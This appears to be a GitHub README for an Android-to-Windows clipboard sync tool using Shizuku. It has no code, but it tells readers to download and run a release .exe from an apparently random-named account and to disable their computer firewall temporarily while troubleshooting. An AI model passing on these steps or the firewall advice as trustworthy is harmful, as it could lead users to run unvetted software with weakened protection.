# 🔄 kde-connect-shizuku - Keep your clipboard synced across devices

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sensible-peacegardenstate555/kde-connect-shizuku)

## 💡 What this does

This application connects your Android phone and Windows computer. It allows your devices to share a single clipboard. When you copy text on one device, you paste it on the other. This version adds support for Shizuku, a service that grants the application extra permissions. These permissions allow the clipboard to stay in sync without extra steps from you.

## ⚙️ System Requirements

To run this application, your setup needs these components:

*   A Windows computer running Windows 10 or Windows 11.
*   An Android smartphone.
*   A stable local network connection (Wi-Fi).
*   The Shizuku app installed on your Android device.

## 🚀 How to Install and Run

1.  Visit the [official download page](https://github.com/sensible-peacegardenstate555/kde-connect-shizuku).
2.  Scroll to the latest release section.
3.  Select the file ending in `.exe` to start the download.
4.  Open the downloaded file once the process finishes.
5.  Follow the instructions on your screen to complete the installation.

## 📱 Setting Up Android and Shizuku

You must configure your Android phone to allow the clipboard sync to work correctly.

1.  Open the Google Play Store on your phone.
2.  Search for and install the Shizuku app.
3.  Launch Shizuku and follow the instructions within the app to activate it. You usually need to follow the wireless debugging steps to start the service.
4.  Once Shizuku shows as active, open the kde-connect-shizuku app.
5.  Grant the requested permissions when the app prompts you. Shizuku will manage these requests automatically.

## 🔗 Connecting Your Devices

After you install the software on both devices, link them.

1.  Open the program on your Windows PC.
2.  Open the mobile application on your Android phone.
3.  Place both devices on the same Wi-Fi network.
4.  The mobile app will detect your computer in its list of available devices.
5.  Select your computer from the list.
6.  Click the pairing request button on your computer screen.
7.  Verify the verification code matches on both screens and confirm the pairing.

## 📋 Using Clipboard Sync

Once the devices pair, the clipboard sync happens in the background.

1.  Copy any text on your computer using your keyboard or mouse.
2.  Wait a second for the signal to travel to your phone.
3.  Open any note or app on your phone and choose Paste.
4.  The text from your computer will appear.
5.  Perform the same steps from your phone to your computer to send text in the opposite direction.

## 🔧 Troubleshooting Common Issues

If the clipboard does not sync, check these points:

*   Confirm both devices share the same Wi-Fi network.
*   Ensure the Shizuku service is running on your Android device. You may need to restart the Shizuku service if you reboot your phone.
*   Check that the app has permission to run in the background on your Android phone.
*   Restart the application on your computer if the connection seems stuck.
*   Disable your computer firewall temporarily to check if it blocks the connection.

## 🔒 Privacy and Security

This application transfers data only between your devices on your local network. It does not send your clipboard data to any outside servers or cloud services. The local network connection keeps your information private to your household or office.
